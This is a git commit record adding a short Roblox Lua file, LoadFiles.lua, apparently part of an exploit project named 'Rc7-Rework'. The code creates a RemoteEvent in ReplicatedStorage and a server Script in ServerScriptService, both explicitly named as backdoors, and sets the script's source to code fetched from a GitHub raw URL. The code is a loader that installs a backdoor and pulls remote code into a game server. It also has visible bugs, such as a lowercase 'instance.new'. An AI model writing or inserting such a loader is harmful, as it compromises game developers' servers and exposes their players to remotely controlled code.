c93dcf8975bdbe0e539b49c53d2216777cb49bfd
Oflice <ofliceofficial@gmail.com>
2025-01-12 20:13:29 +0200

    Create LoadFiles.lua

---
+++ Files/LoadFiles.lua
@@ -0,0 +1,12 @@
+local HttpService = game:GetService("HttpService")
+
+local remoteof = Instance.new("RemoteEvent")
+remoteof.Name = "XX__RC7__XX__REMOTE__BACKDOOR_cx"
+remoteof.Parent = game:GetService("ReplicatedStorage")
+
+local scrurl = "https://raw.githubusercontent.com/Oflice/Rc7-Rework/refs/heads/main/Files/Script.lua"
+
+local Script = instance.new("Script")
+Script.Name = "XX__RC7__XX__SCRIPT_MAIN__BACKDOOR_cx"
+Script.Parent = game:GetService("ServerScriptService")
+Script.Source = HttpService:GetAsync(scrurl)
